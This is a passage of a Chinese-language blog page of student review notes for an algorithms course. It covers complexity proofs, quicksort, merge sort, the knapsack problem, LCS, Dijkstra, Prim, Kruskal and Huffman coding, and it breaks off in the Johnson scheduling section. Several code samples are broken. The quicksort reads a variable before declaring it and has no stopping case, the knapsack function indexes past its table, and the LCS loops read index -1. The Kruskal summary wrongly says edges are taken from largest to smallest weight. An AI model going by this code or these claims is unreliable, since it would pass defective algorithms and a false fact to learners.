<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yiweiboi.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yiweiboi.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="yiweiBoi">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yiweiboi.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/" class="post-title-link" itemprop="url">算法设计与分析复习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-05-11 16:26:03" itemprop="dateCreated datePublished" datetime="2024-05-11T16:26:03+08:00">2024-05-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-12 21:44:01" itemprop="dateModified" datetime="2024-05-12T21:44:01+08:00">2024-05-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="算法的概念"><a href="#算法的概念" class="headerlink" title="算法的概念"></a>算法的概念</h1><ul>
<li><p>什么是算法：算法是由若干条指令组成的有穷序列</p>
</li>
<li><p>算法具有哪些特征：</p>
<ul>
<li>输入（0 个或多个）</li>
<li>输出（一个或多个）</li>
<li>确定性（组成算法的每条指令必须有确定含义，无歧义）</li>
<li>有限性（算法中的指令的条数有限，每条指令的执行次数有限，执行每条指令的时间有限）</li>
<li>可行性（有待实现的运算都是基本运算）</li>
</ul>
</li>
<li><p>什么是算法的复杂性：算法的复杂性指运行所需要的计算机资源量</p>
</li>
<li><p>如何衡量算法的复杂性：用算法运行所需要的计算机资源的量的多少来衡量算法的复杂性</p>
</li>
<li><p>算法不能直接在计算机上执行，程序能直接在计算机上执行</p>
</li>
<li><p>算法的复杂性是指算法在计算机上运行时所消耗的计算机资源的量。最重要的计算机资源是 <strong>时间资源</strong> 和 <strong>空间资源</strong></p>
</li>
<li><p>算法与程序的主要区别在于算法具有 <strong>有限性</strong></p>
</li>
</ul>
<h1 id="证明题"><a href="#证明题" class="headerlink" title="证明题"></a>证明题</h1><ul>
<li>存在常数 C 和自然数 N0，使得 N &gt;&#x3D; N0 时有 f(N) &lt;&#x3D; Cg(N)，记为 f(N) &#x3D; O(g(N))。证明：O(f(N)) + O(g(N)) &#x3D; O(f(N) + g(N))。</li>
</ul>
<style>.gwayoobmqfhf{zoom: 33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/b3dfe4f80c758cf17fab5ba32a659984.jpg" class="gwayoobmqfhf" alt="img">

<ul>
<li>存在常数 C 和自然数 N0，使得 N &gt;&#x3D; N0 时有 f(N) &lt;&#x3D; Cg(N)，记为 f(N) &#x3D; O(g(N))。证明：O(f(N)) * O(g(N)) &#x3D; O(f(N) * g(N))。</li>
</ul>
<style>.eyysxoedljqt{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/6f2a742cf432389d4996650905ce7402.jpg" class="eyysxoedljqt" alt="img">

<ul>
<li>存在常数 C 和自然数 N0，使得 N &gt;&#x3D; N0 时有 f(N) &lt;&#x3D; Cg(N)，记为 f(N) &#x3D; O(g(N))。证明：O(f(N)) + O(g(N)) &#x3D; O(max{f(N), g(N)})。</li>
</ul>
<style>.vkfyoyqwwklf{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/c7f45596273ee692c80e9ed5b0ccfdfa.jpg" class="vkfyoyqwwklf" alt="img">

<h1 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h1><ul>
<li>T(n) &#x3D; 2T(n - 1) + O(1)，T(1) &#x3D; 1，则 T(n) &#x3D; __</li>
</ul>
<style>.phletnfnrbnr{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/cf9a9fc703f5c7dc1a74bc37db46983a.jpg" class="phletnfnrbnr" alt="img">

<h1 id="分治法"><a href="#分治法" class="headerlink" title="分治法"></a>分治法</h1><ul>
<li><p>简述分治法的特征：</p>
<ul>
<li>问题规模足够小时容易解决</li>
<li>将规模大的问题分成规模较小的子问题</li>
<li>子问题相互独立</li>
<li>子问题的解决方法与原问题相同</li>
<li>递归解决子问题</li>
<li>子问题的解能够合并成原问题的解</li>
</ul>
</li>
<li><p>简述分治法的基本思想：</p>
<ul>
<li>将规模为 n 的问题分解为 k 个规模较小的子问题，子问题相互独立且与原问题相同</li>
<li>递归的求解这些子问题</li>
<li>然后将子问题的解合并得到原问题的解</li>
</ul>
</li>
</ul>
<h2 id="二分搜索"><a href="#二分搜索" class="headerlink" title="二分搜索"></a>二分搜索</h2><ul>
<li>二分搜索算法在最坏情况下的时间复杂度是 <strong>O(logn)</strong></li>
<li>用二分搜索算法在一个有序序列中查找某指定元素是否存在，当前查找范围是 a[low:high]，分治策略中的分解操作是 <strong>(low+high)&#x2F;2</strong></li>
<li>对一个有序序列，以比较为基础的搜索算法的最坏时间复杂度为 <strong>O(logn)</strong></li>
</ul>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><ul>
<li><p>简述快速排序算法的思想：</p>
<ul>
<li>选取待排序列的第一个元素为基准元素</li>
<li>通过一趟扫描将待排序列的元素分割成独立的两个序列，第一个序列中元素不大于基准元素，第二个序列中元素不小于基准元素</li>
<li>对两个序列分别递归排序，最终整个序列变成有序序列</li>
</ul>
</li>
<li><p>快速排序算法中，选取基准元素的方法是：随机选取序列中的一个元素作为基准元素（选择题）</p>
</li>
<li><p>快速排序代码实现</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">(<span class="type">int</span>[] a, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> base = a[left];</span><br><span class="line">    <span class="type">int</span> left = start;</span><br><span class="line">    <span class="type">int</span> right = end;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; a[right] &gt;= base) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        a[left] = a[right];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; a[left] &lt; base) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        a[right] = a[left];</span><br><span class="line">    &#125;</span><br><span class="line">    a[left] = base;</span><br><span class="line">    </span><br><span class="line">    quick_sort(a, start, left - <span class="number">1</span>);</span><br><span class="line">    quick_sort(a, left + <span class="number">1</span>, end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>采用快速排序升序 (5, 3, 8, 2, 1, 9, 23, 12, 16)，要求：写出首次分解得到两个子问题的过程、递归结果、子问题的解合并成原问题的解的过程</p>
<ul>
<li>选取基准元素 5 并保存，划分过程如下：<ul>
<li>设置指针 i 指向元素 5，指针 j 指向元素 16</li>
<li>j 向左寻找小于 5 的元素，j 找到 1，将 j 指向的 1 覆盖到 i 指向的 5</li>
<li>i 向右寻找大于等于 5 的元素，i 找到 8，将 i 指向的 8 覆盖到 j 指向的 1</li>
<li>j 继续向左寻找小于 5 的元素，j 找到 2，将 j 指向的 2 覆盖到 i 指向的 8</li>
<li>i 继续向右寻找大于等于 5 的元素，i &#x3D;&#x3D; j 指向了 2</li>
<li>将基准元素覆盖到 i、j 指向的 2</li>
<li>此时两个子问题为 {1, 3, 2}、{8, 9, 23, 12, 16}</li>
</ul>
</li>
<li>递归的结果为 {1, 2, 3}、{8, 9, 12, 16, 23}</li>
<li>此时整个序列有序，为 {1, 2, 3, 5, 8, 9, 12, 16, 23}</li>
</ul>
</li>
<li><p>请使用快速排序升序排序 (10, 18, 10, 9, 15, 6, 3, 2, 24, 4)，给出第一趟划分结果及后续操作</p>
</li>
</ul>
<style>.vntpuqhctyho{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/d21d4614799775b3e5fb3c034fd17f01.jpg" class="vntpuqhctyho" alt="img">

<ul>
<li>请使用快速排序升序排序 (5, 1, 4, 3, 9, 6, 3, 2, 8, 10, 7)，给出第一趟划分结果及后续操作</li>
</ul>
<style>.mydjuvayhgfh{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/a9a9e90d2acc75c7f9936b39f414f264.jpg" class="mydjuvayhgfh" alt="img">

<h2 id="合并排序"><a href="#合并排序" class="headerlink" title="合并排序"></a>合并排序</h2><ul>
<li>使用分治法设计合并排序算法</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span>[] a, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        merge_sort(a, left, mid);</span><br><span class="line">        merge_sort(a, mid + <span class="number">1</span>, right);</span><br><span class="line">        merge(a, left, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>采用合并排序的思想将给定序列 T[1:9] &#x3D; {5, 3, 8, 2, 1, 9, 23, 12, 6} 升序，要求：写出首次分解得到两个子问题的过程、递归结果、子问题的解合并成原问题的解的过程</p>
<ul>
<li><p>(1 + 9) &#x2F; 2 &#x3D; 5</p>
</li>
<li><p>两个子问题是：T[1:5]、T[6:9]</p>
</li>
<li><p>递归的结果：T[1:5] &#x3D; {1, 2, 3, 5, 8}，T[6:9] &#x3D; {6, 9, 12, 23}</p>
</li>
<li><p>两个子问题合并得到原问题的解，合并过程如下：</p>
<ul>
<li>将 1, 2, 3, 5 放入辅助数组</li>
<li>将 6 放入辅助数组</li>
<li>将 8 放入辅助数组</li>
<li>将 9, 12, 23 放入辅助数组，得到一个有序序列</li>
</ul>
</li>
<li><p>将辅助数组中的元素复制到数组 T，得到 T[1:9] &#x3D; {1, 2, 3, 5, 6, 8, 9, 12, 23}</p>
</li>
</ul>
</li>
</ul>
<h2 id="棋盘覆盖问题"><a href="#棋盘覆盖问题" class="headerlink" title="棋盘覆盖问题"></a>棋盘覆盖问题</h2><ul>
<li>对于如下 2^3^ * 2^3^ 的特殊棋盘，共需要多少 L 型骨牌；并在棋盘上填写 L 型骨牌的覆盖情况。</li>
</ul>
<style>.aczurgxwilfr{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/dce9ae0daba371a20b1329701a453dfb.jpg" class="aczurgxwilfr" alt="img">

<style>.jgjvdbrcmgnh{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/00309eebce67d0b8269c011e53dc30f5.jpg" class="jgjvdbrcmgnh" alt="img">

<h2 id="循环赛日程表"><a href="#循环赛日程表" class="headerlink" title="循环赛日程表"></a>循环赛日程表</h2><ul>
<li>有 n &#x3D; 2^k^ 个运动员要进行循环赛，设计一个赛程表：1. 每个选手必须和其他 n - 1 个选手各比赛一次；2. 每个选手一天至多比赛一次；3. 循环赛要在最短时间内完成；（1）如果 n &#x3D; 2^k^，循环赛最少需要进行几天（2）当 n &#x3D; 2^3^ &#x3D; 8 时，画出循环赛日程表</li>
</ul>
<style>.qlnznwgttyms{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/ecacc48cc2780a67de1bf5a074b4f92b.jpg" class="qlnznwgttyms" alt="img">

<h1 id="动态规划法"><a href="#动态规划法" class="headerlink" title="动态规划法"></a>动态规划法</h1><ul>
<li><p>简述动态规划求解优化问题的步骤：</p>
<ul>
<li>最优子结构性质分析</li>
<li>递归定义最优值</li>
<li>以自底向上的方式计算出最优值</li>
<li>根据计算最优值时得到的信息，构造最优解</li>
</ul>
</li>
<li><p>动态规划算法的主要步骤：</p>
<ul>
<li><p>问题具有最优子结构性质</p>
</li>
<li><p>构造最优值的递归关系表达式</p>
</li>
<li><p>最优值的算法描述</p>
</li>
<li><p>构造最优值</p>
</li>
</ul>
</li>
<li><p>动态规划算法的基本要素：最优子结构性质、重叠子问题、自底向上的求解方法</p>
</li>
</ul>
<h2 id="0-1-背包问题"><a href="#0-1-背包问题" class="headerlink" title="0-1 背包问题"></a>0-1 背包问题</h2><ul>
<li><p>描述 0-1 背包问题：已知一个背包容量为 c，有 n 件物品，物品 i 的重量为 Wi，价值为 Vi，应如何选择装入背包中的物品，使得总价值最大</p>
</li>
<li><p>0-1 背包问题代码实现</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">knapSack</span><span class="params">(<span class="type">int</span> c, <span class="type">int</span> n, <span class="type">int</span>[] w, <span class="type">int</span>[] v, <span class="type">int</span>[][] dp)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dp[n + <span class="number">1</span>][c + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= c; i++) dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= c; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; w[i]) &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = max(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - w[i]] + v[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n + <span class="number">1</span>][c + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>用贪心算法解决背包问题时所用的贪心策略是：单位重量的价值大的物品优先装入背包</p>
</li>
<li><p>0-1 背包问题用动态规划算法的时间复杂度为 <strong>O(nc)</strong></p>
</li>
<li><p>有 0-1 背包问题如下：n &#x3D; 4，c &#x3D; 13，P &#x3D; (18, 15, 8, 12)，W &#x3D; (10, 2, 3, 4)。试用动态规划求出问题的最优解和最优值</p>
</li>
</ul>
<style>.sluledmynkfe{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/c691e25d3af8ae45bab678a19a08e371.jpg" class="sluledmynkfe" alt="img">

<style>.hhjwdcekybjh{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/84b6f519dc4176d074e239a883e13cbb.jpg" class="hhjwdcekybjh" alt="img">

<h2 id="最长公共子序列问题"><a href="#最长公共子序列问题" class="headerlink" title="最长公共子序列问题"></a>最长公共子序列问题</h2><ul>
<li>最长公共子序列问题代码实现</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, <span class="type">char</span>[] x, <span class="type">char</span>[] y, <span class="type">int</span>[][] c, <span class="type">int</span>[][] b)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= m; i++) c[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++) c[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x[i] == y[j]) &#123;</span><br><span class="line">                c[i][j] = c[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                b[i][j] = <span class="number">1</span>; <span class="comment">// 1:LU</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                c[i][j] = max(c[i - <span class="number">1</span>][j], c[i][j - <span class="number">1</span>]);</span><br><span class="line">                b[i][j] = c[i][j] == c[i - <span class="number">1</span>][j] ? <span class="number">2</span> : <span class="number">3</span>; <span class="comment">// 2:U 3:L</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ul>
<li>给定两个序列的长度分别为 m、n，求这两个序列的最长公共子序列耗时 <strong>O(mn)</strong></li>
</ul>
<style>.ocpfofmtsxrl{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/d07160810c0c4bce9769e195b7f2863f.jpg" class="ocpfofmtsxrl" alt="img">

<h2 id="矩阵连乘问题"><a href="#矩阵连乘问题" class="headerlink" title="矩阵连乘问题"></a>矩阵连乘问题</h2><ul>
<li><p>用 A[1:n] 表示 A1…An 连乘，给定 A[1:10]，用动态规划算法求解时，用来存储各子问题最优值的二维数组共有 <strong>100</strong> 个存储单元</p>
</li>
<li><p>用 A[1:n] 表示 A1…An 连乘，用动态规划求解 A[1:n] 时，计算各子问题最优值的复杂度是 <strong>O(n^3^)</strong></p>
</li>
<li><p>M1(5 * 10)，M2(10 * 4)，M3(4 * 6)。矩阵连乘 M1 * M2 * M3 需要最少乘法次数为 <strong>320</strong>（5 * 4 * 10 + 5 * 6 * 4 &#x3D; 320）</p>
</li>
</ul>
<h1 id="贪心法"><a href="#贪心法" class="headerlink" title="贪心法"></a>贪心法</h1><ul>
<li>贪心法的两个基本要素：贪心选择性质、最优子结构性质</li>
<li>贪心策略设计算法的关键是：选好贪心策略</li>
</ul>
<h2 id="Difkstra-算法"><a href="#Difkstra-算法" class="headerlink" title="Difkstra 算法"></a>Difkstra 算法</h2><ul>
<li>简述求单源最短路径问题的 Dijkstra 算法思想：<ul>
<li>初始时令 S &#x3D; {源点}，Dist 数组记录最短特殊路径长度，重复如下操作</li>
<li>选择一条特殊最短路径，将其连接的 V-S 中的点加入 S，更新特殊最短路径</li>
<li>直到 S &#x3D; V 为止，根据前驱数组的记录，构建最优解</li>
</ul>
</li>
<li>用贪心算法求 s 到 t 的最短路</li>
</ul>
<style>.cjynnvemfcyb{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/9ccc62b3bfdd142687b23e8ba91ead3e.jpg" class="cjynnvemfcyb" alt="img">

<style>.wcpdwefpfhrw{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/786e2a92c1695ead1a6b852563f45346.jpg" class="wcpdwefpfhrw" alt="img">

<h2 id="Prim-算法"><a href="#Prim-算法" class="headerlink" title="Prim 算法"></a>Prim 算法</h2><ul>
<li>Prim 算法构造最小生成树的基本思想：<ul>
<li>初始时令 U &#x3D; (u0)，u0 ∈ V，TE &#x3D; {}</li>
<li>选取 i ∈ U，j ∈ V - U，边 (i, j) 是连接 U 和 V - U 所有边中最短的</li>
<li>然后，将 j 加入集合 U，将边 (i, j) 加入到集合 TE 中</li>
<li>继续上面的贪心选择直到 U &#x3D; V 为止</li>
</ul>
</li>
<li>Prim 算法生成最小生成树的过程中，贪心策略是：<ul>
<li>选取 i ∈ U，j ∈ V - U，边 (i, j) 是连接 U 和 V - U 所有边中最短的</li>
<li>然后，将 j 加入集合 U，将边 (i, j) 加入到最小生成树中</li>
</ul>
</li>
<li>给定 n 个顶点的无向连通图，Prim 算法的时间复杂度为 <strong>O(n^2^)</strong></li>
<li>使用 Prim 算法求最小生成树</li>
</ul>
<style>.lzibojpdsfwx{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/700466b5efe108a2774d8594a7531743.jpg" class="lzibojpdsfwx" alt="img">

<h2 id="Kruskal-算法"><a href="#Kruskal-算法" class="headerlink" title="Kruskal 算法"></a>Kruskal 算法</h2><ul>
<li><p>Kruskal 算法的时间复杂度为 <strong>eloge</strong>，e 为无向连通图的边数</p>
</li>
<li><p>对稀疏图，Kruskal 算法比 Prim 算法有效</p>
</li>
<li><p>Kruskal 算法基本思想：</p>
<ul>
<li>按照图中边权由大到小的次序依次考虑每条边是否加入最小生成树中</li>
<li>当考虑到某条边时，如果该边与已经加入到最小生成树中的边不形成回路，则将该边加入进去</li>
</ul>
</li>
</ul>
<style>.fdccvkysiiwc{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/28c4128ff54b201f901b17477f2fd552.jpg" class="fdccvkysiiwc" alt="img">

<ul>
<li>使用 Kruskal 算法求最小生成树</li>
</ul>
<style>.bzgkjvwjwvkc{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/0e0a864b988b7fb477bebfb9fb1b228b.jpg" class="bzgkjvwjwvkc" alt="img">

<h2 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h2><ul>
<li>简述哈夫曼编码算法的思想：<ul>
<li>将 n 个字符看做 n 棵孤立的树，组成一个集合</li>
<li>从集合中取出两棵出现频率最低的树，让其作为左右子树构成一棵新树，新树的频率为左右子树频率之和，将那个新树插入到集合中</li>
<li>重复操作，直到只剩下一颗树为止</li>
</ul>
</li>
<li>已知元素出现频率 (a, b, c, d, e, f, g) &#x3D; (0.15, 0.25, 0.12, 0.05, 0.03, 0.1, 0.3)，请建立哈夫曼编码对应的二叉树，并写出相应元素的编码。</li>
</ul>
<style>.gjkxrhmxihpp{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/8f430532951518f222caf2d7f7dc2ebd.jpg" class="gjkxrhmxihpp" alt="img">

<h2 id="流水作业调度问题-Johnson-算法"><a href="#流水作业调度问题-Johnson-算法" class="headerlink" title="流水作业调度问题 Johnson 算法"></a>流水作业调度问题 Johnson 算法</h2><ul>
<li><p>流水线作业调度问题的 Johnson 算法的思想：</p>
<ul>
<li>令 N1 &#x3D; {i|ai &lt; bi}，N2 &#x3D; {i|ai &gt;&#x3D; bi}</li>
<li>将 N1 中作业按 ai 递增排序，将 N2 中作业按 bi 递减排序</li>
